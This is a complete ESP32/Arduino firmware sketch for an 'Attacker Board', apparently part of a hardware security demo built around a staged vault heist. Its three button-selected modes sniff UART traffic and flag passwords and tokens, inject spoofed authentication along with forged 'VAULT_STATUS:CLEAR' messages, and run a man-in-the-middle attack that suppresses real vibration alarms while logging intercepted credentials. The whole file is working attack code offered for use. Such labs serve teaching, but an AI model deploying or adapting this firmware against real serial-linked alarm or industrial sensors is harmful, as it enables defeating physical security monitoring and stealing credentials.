/*
 * attacker.ino — "The Attacker Board" (Blue Case)
 *
 * Multi-mode attacker firmware. Press the BOOT button to cycle
 * through three attack modes. The onboard LED blinks to indicate
 * the current mode:
 *
 *   Mode 1 — SNIFF:  one flash every 3 seconds
 *   Mode 2 — INJECT: two flashes every 3 seconds
 *   Mode 3 — MITM:   three flashes every 3 seconds
 *
 * SNIFF wiring:
 *   White GPIO 17 (TX) → Blue GPIO 16 (RX)
 *   Shared GND
 *
 * INJECT wiring:
 *   Blue GPIO 17 (TX) → White GPIO 16 (RX)
 *   Shared GND
 *
 * MITM wiring:
 *   White GPIO 17 (TX) → Blue GPIO 4 (UART1 RX)
 *   Blue GPIO 17 (TX)  → White GPIO 16 (RX)
 *   Shared GND
 *
 * No external libraries required.
 */

#define BOOT_BUTTON    0      // GPIO 0 = BOOT button on most DevKitC boards
#define LED_PIN        2      // GPIO 2 = onboard blue LED
#define UART2_TX       17
#define UART2_RX       16
#define MITM_RX_PIN    4      // UART1 RX for MITM mode
#define BAUD_RATE      9600

HardwareSerial MitmUART(1);   // UART1 for MITM receive

// Modes
enum Mode { SNIFF = 1, INJECT = 2, MITM_MODE = 3 };
Mode currentMode = SNIFF;

// LED blink state
unsigned long lastBlinkCycle = 0;
const unsigned long BLINK_CYCLE = 3000;   // 3 second cycle
const unsigned long BLINK_ON = 200;       // LED on duration
const unsigned long BLINK_GAP = 500;      // gap between flashes

// Button debounce
bool lastButtonState = HIGH;
unsigned long lastDebounceTime = 0;
const unsigned long DEBOUNCE_DELAY = 300;

// Injector state
unsigned long lastAuthTime = 0;
const unsigned long AUTH_INTERVAL = 15000;
String fakeUser  = "vault_admin";
String fakePass  = "F1r$tN@t10nal#2026!";
String fakeToken = "eyJhbGciOiJIUzI1NiJ9.dmF1bHRfYWRtaW4.v4u1t_s3cr3t";

// MITM state
String fakeStatus    = "CLEAR";
int    fakeVibration = 0;
bool   stealCreds    = true;

void sendFakeAuth() {
  Serial2.println("[VAULT-SENSOR] Authenticating to security gateway...");
  delay(300);
  Serial2.println("[VAULT-SENSOR] DEVICE_ID: VAULT-7-VIBRATION-01");
  delay(200);
  Serial2.println("[VAULT-SENSOR] USER: " + fakeUser);
  delay(200);
  Serial2.println("[VAULT-SENSOR] PASS: " + fakePass);
  delay(200);
  Serial2.println("[VAULT-SENSOR] AUTH_TOKEN: " + fakeToken);
  delay(300);
  Serial2.println("[VAULT-SENSOR] Session established. Monitoring vault...");
  Serial2.println();
}

void printBanner() {
  Serial.println();
  Serial.println("===================================");
  Serial.println("  ATTACKER BOARD v1.0");
  Serial.println("===================================");
  Serial.println();
  Serial.println("Press BOOT button to cycle modes:");
  Serial.println("  Mode 1 (1 blink): SNIFF");
  Serial.println("  Mode 2 (2 blinks): INJECT");
  Serial.println("  Mode 3 (3 blinks): MITM");
  Serial.println();
}

void printModeChange() {
  Serial.println();
  Serial.println("-----------------------------------");
  switch (currentMode) {
    case SNIFF:
      Serial.println("  MODE: SNIFF (1 blink)");
      Serial.println("  Wire: White TX (GPIO 17) → Blue RX (GPIO 16)");
      Serial.println("  Listening for UART data...");
      break;
    case INJECT:
      Serial.println("  MODE: INJECT (2 blinks)");
      Serial.println("  Wire: Blue TX (GPIO 17) → White RX (GPIO 16)");
      Serial.println("  Sending fake CLEAR status...");
      break;
    case MITM_MODE:
      Serial.println("  MODE: MITM (3 blinks)");
      Serial.println("  Wire: White TX → Blue GPIO 4, Blue TX → White RX");
      Serial.println("  Intercepting and suppressing alerts...");
      break;
  }
  Serial.println("-----------------------------------");
  Serial.println();
}

bool isSensitive(String &line) {
  return (line.indexOf("PASS") >= 0 ||
          line.indexOf("TOKEN") >= 0 ||
          line.indexOf("USER") >= 0 ||
          line.indexOf("AUTH") >= 0 ||
          line.indexOf("DEVICE_ID") >= 0);
}

// ============================================================
// LED BLINK PATTERN
// ============================================================

void updateLED() {
  unsigned long elapsed = millis() - lastBlinkCycle;

  if (elapsed >= BLINK_CYCLE) {
    lastBlinkCycle = millis();
    elapsed = 0;
  }

  int numBlinks = (int)currentMode;
  bool ledOn = false;

  for (int i = 0; i < numBlinks; i++) {
    unsigned long blinkStart = i * (BLINK_ON + BLINK_GAP);
    if (elapsed >= blinkStart && elapsed < blinkStart + BLINK_ON) {
      ledOn = true;
      break;
    }
  }

  digitalWrite(LED_PIN, ledOn ? HIGH : LOW);
}

// ============================================================
// BUTTON HANDLING
// ============================================================

void checkButton() {
  bool reading = digitalRead(BOOT_BUTTON);

  if (reading == LOW && lastButtonState == HIGH) {
    if (millis() - lastDebounceTime > DEBOUNCE_DELAY) {
      lastDebounceTime = millis();

      // Cycle mode
      if (currentMode == SNIFF) currentMode = INJECT;
      else if (currentMode == INJECT) currentMode = MITM_MODE;
      else currentMode = SNIFF;

      lastAuthTime = 0;  // Reset auth timer on mode change
      printModeChange();
    }
  }

  lastButtonState = reading;
}

// ============================================================
// MODE FUNCTIONS
// ============================================================

void runSniff() {
  if (Serial2.available()) {
    String captured = Serial2.readStringUntil('\n');
    captured.trim();

    if (captured.length() > 0) {
      float elapsed = millis() / 1000.0;

      if (isSensitive(captured)) {
        Serial.print("[");
        Serial.print(elapsed, 1);
        Serial.print("s] *** CAPTURED: ");
        Serial.print(captured);
        Serial.println(" ***");
      } else {
        Serial.print("[");
        Serial.print(elapsed, 1);
        Serial.print("s] ");
        Serial.println(captured);
      }
    }
  }
}

void runInject() {
  // Periodic fake auth
  if (millis() - lastAuthTime >= AUTH_INTERVAL) {
    if (lastAuthTime > 0) {
      Serial2.println();
      Serial2.println("[VAULT-SENSOR] Session expired. Re-authenticating...");
      delay(500);
    }
    sendFakeAuth();
    lastAuthTime = millis();
    Serial.println("[HEIST] Sent spoofed auth sequence");
  }

  // Send fake CLEAR
  String msg = "VAULT_STATUS:CLEAR VIBRATION:0 EVENTS:0";
  Serial2.println(msg);
  Serial.println("[HEIST] Sent: " + msg + "  (drill is running)");
  delay(2000);
}

unsigned long lastMitmClear = 0;

void runMITM() {
  // Continuously send CLEAR every 100ms to keep the override active
  if (millis() - lastMitmClear >= 100) {
    String suppressed = "VAULT_STATUS:" + fakeStatus +
                       " VIBRATION:" + String(fakeVibration) +
                       " EVENTS:0";
    Serial2.println(suppressed);
    lastMitmClear = millis();
  }

  // Also process any incoming data from the real sensor
  if (MitmUART.available()) {
    String incoming = MitmUART.readStringUntil('\n');
    incoming.trim();

    if (incoming.length() == 0) return;

    // Credential interception: log but forward unchanged
    if (incoming.indexOf("PASS") >= 0 || incoming.indexOf("TOKEN") >= 0 ||
        incoming.indexOf("USER") >= 0) {
      if (stealCreds) {
        Serial.println("[MITM] >>>> CREDENTIAL CAPTURED: " + incoming + " <<<<");
      }
      Serial2.println(incoming);
      return;
    }

    // Log suppressed alerts
    if (incoming.startsWith("VAULT_STATUS:")) {
      String realStatus = "UNKNOWN";
      int colonPos = incoming.indexOf(':');
      int spacePos = incoming.indexOf(' ');
      if (colonPos >= 0 && spacePos > colonPos) {
        realStatus = incoming.substring(colonPos + 1, spacePos);
      }

      if (realStatus != "CLEAR") {
        Serial.println("[MITM] SUPPRESSED: " + incoming);
      }
      return;  // Already sending CLEAR continuously above
    }

    // Pass through anything else
    Serial2.println(incoming);
    Serial.println("  FORWARDED: (unmodified)");
  }
}

// ============================================================
// SETUP & LOOP
// ============================================================

void setup() {
  Serial.begin(115200);

  // UART2 for sniff (RX) and inject/MITM (TX)
  Serial2.begin(BAUD_RATE, SERIAL_8N1, UART2_RX, UART2_TX);

  // UART1 for MITM receive (RX only)
  MitmUART.begin(BAUD_RATE, SERIAL_8N1, MITM_RX_PIN, -1);

  pinMode(BOOT_BUTTON, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  // LED startup test: 3 rapid blinks to confirm LED works
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
    delay(200);
  }

  printBanner();
  printModeChange();
}

void loop() {
  updateLED();
  checkButton();

  switch (currentMode) {
    case SNIFF:
      runSniff();
      break;
    case INJECT:
      runInject();
      break;
    case MITM_MODE:
      runMITM();
      break;
  }
}
